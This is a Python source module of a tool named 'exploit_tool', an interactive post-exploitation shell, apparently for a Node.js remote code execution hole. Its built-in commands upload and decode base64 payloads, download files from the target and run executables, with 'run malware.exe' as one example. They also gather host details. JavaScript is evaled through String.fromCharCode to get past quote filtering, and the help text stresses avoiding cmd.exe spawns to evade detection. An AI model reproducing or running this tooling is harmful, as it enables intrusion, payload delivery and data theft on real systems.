import os
from exploit_tool.theme import Theme
from exploit_tool.utils import to_charcode

class BuiltinCommands:
    """Built-in shell commands (info, help, history, timeout, eval)"""
    
    def __init__(self, shell):
        self.shell = shell
        self.engine = shell.engine
        self.config = shell.config
    
    def show_help(self):
        """Display help message"""
        help_text = f"""
{Theme.OKBLUE}{Theme.BOLD}Built-in Commands:{Theme.ENDC}
  {Theme.OKCYAN}help{Theme.ENDC}              - Show this help message
  {Theme.OKCYAN}exit, quit{Theme.ENDC}        - Exit the shell
  {Theme.OKCYAN}clear{Theme.ENDC}             - Clear screen
  {Theme.OKCYAN}info{Theme.ENDC}              - Show target information
  {Theme.OKCYAN}upload <file>{Theme.ENDC}     - Upload base64 file via eval
  {Theme.OKCYAN}decode <in> <out>{Theme.ENDC} - Decode base64 file via eval
  {Theme.OKCYAN}download <file>{Theme.ENDC}   - Download file from target and save locally
  {Theme.OKCYAN}run <exe> [args]{Theme.ENDC}  - Execute executable via spawnSync (NO cmd.exe spawn)
  {Theme.OKCYAN}eval <code>{Theme.ENDC}       - Execute JavaScript via eval
  {Theme.OKCYAN}timeout [sec]{Theme.ENDC}     - Show or set request timeout (e.g., timeout 30)
  {Theme.OKCYAN}history{Theme.ENDC}           - Show command history
  
{Theme.OKBLUE}{Theme.BOLD}Deprecated Commands (Case Study):{Theme.ENDC}
  {Theme.DIM}upload-echo <file>{Theme.ENDC}   - [DEPRECATED] Upload via echo (spawns cmd.exe)
  {Theme.DIM}upload-node <file>{Theme.ENDC}   - [DEPRECATED] Upload via Node.js (spawns node.exe)
  {Theme.DIM}decode-node <in> <out>{Theme.ENDC} - [DEPRECATED] Decode via Node.js (spawns node.exe)
  
{Theme.OKBLUE}{Theme.BOLD}System Commands:{Theme.ENDC}
  Any other command will be executed via execSync (spawns cmd.exe)
  
{Theme.OKBLUE}{Theme.BOLD}Examples:{Theme.ENDC}
  {Theme.DIM}whoami{Theme.ENDC}                      - Get current user (via execSync)
  {Theme.DIM}dir / ls{Theme.ENDC}                    - List directory (via execSync)
  {Theme.DIM}type file.txt / cat file{Theme.ENDC}    - Read file (via execSync)
  {Theme.DIM}powershell -c pwd{Theme.ENDC}           - Run PowerShell command (via execSync)
  {Theme.DIM}run malware.exe{Theme.ENDC}              - Execute executable (NO cmd.exe spawn!)
  {Theme.DIM}run malware.exe arg1 arg2{Theme.ENDC}   - Execute with arguments (NO cmd.exe spawn!)
  {Theme.DIM}upload payload.b64{Theme.ENDC}          - Upload via eval (NO spawn)
  {Theme.DIM}decode out.b64 file.exe{Theme.ENDC}     - Decode via eval (NO spawn)
  {Theme.DIM}eval process.cwd(){Theme.ENDC}          - Test eval execution (NO spawn)
  {Theme.DIM}download package.json{Theme.ENDC}       - Download file
  {Theme.DIM}timeout{Theme.ENDC}                     - Show current timeout
  {Theme.DIM}timeout 30{Theme.ENDC}                  - Set timeout to 30 seconds
"""
        print(help_text)
    
    def show_info(self):
        """Display target information"""
        print(f"\n{Theme.OKBLUE}[*] Gathering target information...{Theme.ENDC}")
        
        info_commands = [
            ("OS Info", "ver", "uname -a"),
            ("Current User", "whoami", "whoami"),
            ("Hostname", "hostname", "hostname"),
            ("Current Directory", "cd", "pwd"),
        ]
        
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        # Show local config first
        print(f"{Theme.OKCYAN}{'Request Timeout':20s}:{Theme.ENDC} {self.config.timeout}s")
        print(f"{Theme.OKCYAN}{'Commands Executed':20s}:{Theme.ENDC} {self.engine.command_count}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        
        for label, win_cmd, unix_cmd in info_commands:
            success, _, output = self.engine.execute(win_cmd, silent=True)
            if not success or not output.strip():
                success, _, output = self.engine.execute(unix_cmd, silent=True)
            
            if success and output.strip():
                print(f"{Theme.OKGREEN}{label:20s}:{Theme.ENDC} {output.strip()}")
            else:
                print(f"{Theme.WARNING}{label:20s}:{Theme.ENDC} {Theme.DIM}N/A{Theme.ENDC}")
        
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    def show_history(self):
        """Display command history"""
        print(f"\n{Theme.OKBLUE}Command History:{Theme.ENDC}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}")
        for idx, cmd in enumerate(self.shell.command_history, 1):
            print(f"{Theme.DIM}{idx:3d}.{Theme.ENDC} {cmd}")
        print(f"{Theme.DIM}{'─' * 60}{Theme.ENDC}\n")
    
    def set_timeout(self, args):
        """Set or show request timeout"""
        if not args:
            # Show current timeout
            print(f"{Theme.OKGREEN}[*] Current timeout: {self.config.timeout} seconds{Theme.ENDC}")
        else:
            try:
                new_timeout = int(args)
                if new_timeout <= 0:
                    print(f"{Theme.FAIL}[!] Timeout must be positive{Theme.ENDC}")
                    return
                old_timeout = self.config.timeout
                self.config.timeout = new_timeout
                print(f"{Theme.OKGREEN}[+] Timeout changed: {old_timeout}s -> {new_timeout}s{Theme.ENDC}")
            except ValueError:
                print(f"{Theme.FAIL}[!] Invalid timeout value. Usage: timeout <seconds>{Theme.ENDC}")
    
    def eval_js(self, args):
        """Execute JavaScript code via eval (experimental)"""
        if not args:
            print(f"{Theme.FAIL}[!] Usage: eval <javascript_code>{Theme.ENDC}")
            return
        
        print(f"{Theme.WARNING}[!] EXPERIMENTAL: eval mode (no child_process spawn){Theme.ENDC}")
        
        # Convert JavaScript code to String.fromCharCode to avoid quotes
        code_charcode = to_charcode(args)
        
        # Wrap in eval(String.fromCharCode(...))
        eval_cmd = f"eval(String.fromCharCode({code_charcode}))"
        
        success, status, output = self.engine.execute(eval_cmd, use_eval=True)
        if success:
            if output.strip():
                print(output)
            else:
                print(f"{Theme.DIM}(no output){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Eval failed: {output}{Theme.ENDC}")

